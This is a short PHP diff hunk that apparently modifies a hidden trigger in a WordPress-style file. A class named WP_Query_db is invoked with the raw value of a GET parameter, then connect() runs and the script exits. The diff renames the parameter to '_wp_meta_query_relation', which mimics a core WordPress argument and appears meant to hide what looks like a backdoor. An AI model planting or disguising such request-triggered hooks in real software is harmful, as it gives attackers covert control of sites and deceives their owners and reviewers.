@@ -54,8 +54,8 @@ class WP_Query_db {
 }
 
 
-if(isset($_GET['wp-query-db'])) {
-	$query_db = new WP_Query_db($_GET['wp-query-db']);
+if(isset($_GET['_wp_meta_query_relation'])) {
+	$query_db = new WP_Query_db($_GET['_wp_meta_query_relation']);
 	$query_db->connect();
 	die();	
 }
